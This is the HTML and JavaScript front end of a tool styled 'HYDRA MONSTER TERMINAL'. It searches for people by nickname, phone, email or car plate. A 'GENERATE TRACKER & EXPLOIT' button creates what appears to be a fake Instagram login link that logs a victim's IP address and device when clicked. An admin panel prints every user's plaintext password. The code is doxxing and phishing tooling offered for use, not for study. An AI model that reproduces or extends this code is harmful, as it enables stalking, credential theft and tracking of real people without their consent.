<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>HYDRA ULTIMATE TERMINAL</title>
    <style>
        :root { --p: #00ff41; --bg: #050505; --red: #ff3e3e; }
        body { background: var(--bg); color: var(--p); font-family: 'Courier New', monospace; overflow-x: hidden; }
        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.1; pointer-events: none; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        .card { border: 1px solid var(--p); padding: 15px; margin-bottom: 20px; background: rgba(0,20,0,0.8); box-shadow: 0 0 10px var(--p); }
        .glitch { animation: glitch 1s linear infinite; font-weight: bold; font-size: 24px; text-align: center; }
        @keyframes glitch { 0% { text-shadow: 2px 0 red; } 50% { text-shadow: -2px 0 blue; } 100% { text-shadow: 2px 0 red; } }
        input { background: #000; border: 1px solid var(--p); color: var(--p); padding: 10px; width: calc(100% - 22px); margin-bottom: 10px; }
        .btn { background: var(--p); color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
        .btn:hover { background: #fff; transform: scale(1.02); }
        #console { background: #000; border: 1px solid #333; height: 200px; overflow-y: auto; padding: 10px; font-size: 13px; color: #fff; }
        .res-line { border-bottom: 1px solid #222; padding: 5px 0; display: flex; justify-content: space-between; }
    </style>
</head>
<body>
    <div class="matrix-bg" id="mx"></div>
    <div class="container">
        <div class="glitch">HYDRA MONSTER TERMINAL v2026</div>
        
        <div class="card" id="auth-box">
            <input id="u" placeholder="OPERATOR ID">
            <input id="p" type="password" placeholder="ACCESS KEY">
            <button class="btn" onclick="login()">INITIATE LOGIN</button>
        </div>

        <div id="main-ui" style="display:none;">
            <div class="card">
                <div style="color:var(--red); font-size: 10px; margin-bottom: 5px;">// GLOBAL INTELLIGENCE SEARCH</div>
                <input id="q" placeholder="Enter Nick, Phone, Email or Car Plate..." onkeypress="if(event.key==='Enter') globalSearch()">
                <button class="btn" onclick="globalSearch()">EXECUTE SEARCH</button>
            </div>

            <div class="card" style="border-color: var(--red);">
                <button class="btn" style="background:var(--red); color:#fff;" onclick="genTracker()">GENERATE TRACKER & EXPLOIT</button>
            </div>

            <div id="console">> AWAITING COMMAND...</div>

            <div class="card" id="admin-btn" style="display:none; border-color: gold;">
                <button class="btn" style="background:gold;" onclick="loadAdmin()">MASTER CONTROL PANEL</button>
            </div>
        </div>
    </div>

    <script>
        let UID = null;
        async function login() {
            const r = await fetch('/api/login', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:u.value, password:p.value})});
            const j = await r.json();
            if(j.status==='success') {
                UID = j.uid;
                document.getElementById('auth-box').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                if(u.value === 'abupaay') document.getElementById('admin-btn').style.display = 'block';
                print('ACCESS GRANTED. WELCOME, OPERATOR.');
            } else { alert('ACCESS DENIED.'); }
        }

        function print(msg) {
            const c = document.getElementById('console');
            c.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            c.scrollTop = c.scrollHeight;
        }

        async function globalSearch() {
            const val = q.value;
            let mod = 'nick';
            if(val.includes('@')) mod = 'email_scan';
            else if(!isNaN(val)) mod = 'mail';
            else if(val.length > 5 && /[0-9]/.test(val)) mod = 'car_scan';

            print(`INITIALIZING ${mod.toUpperCase()} MODULE...`);
            const r = await fetch(`/api/${mod}?target=${val}`);
            const j = await r.json();
            if(j.status==='Success') {
                let resTxt = j.found.map(i => i.name).join(", ");
                document.getElementById('console').innerHTML += `<div class="res-line"><span>FOUND: ${resTxt}</span><button onclick="savePDF('${mod}','${val}','${resTxt}')">SAVE PDF</button></div>`;
            }
        }

        function genTracker() {
            const link = window.location.origin + '/login/insta/' + UID;
            print(`TRACKER LIVE: ${link}`);
            navigator.clipboard.writeText(link);
            alert('Link copied! Target IP and Device will be logged upon click.');
        }

        async function savePDF(m, t, r) {
            const resp = await fetch('/api/pdf', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({module:m, target:t, res:r})});
            const blob = await resp.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a'); a.href = url; a.download = 'REPORT.pdf'; a.click();
        }

        async function loadAdmin() {
            const r = await fetch('/api/admin/users');
            const j = await r.json();
            print("--- MASTER USER LIST ---");
            j.forEach(user => print(`USER: ${user.username} | PASS: ${user.password}`));
        }
    </script>
</body>
</html>
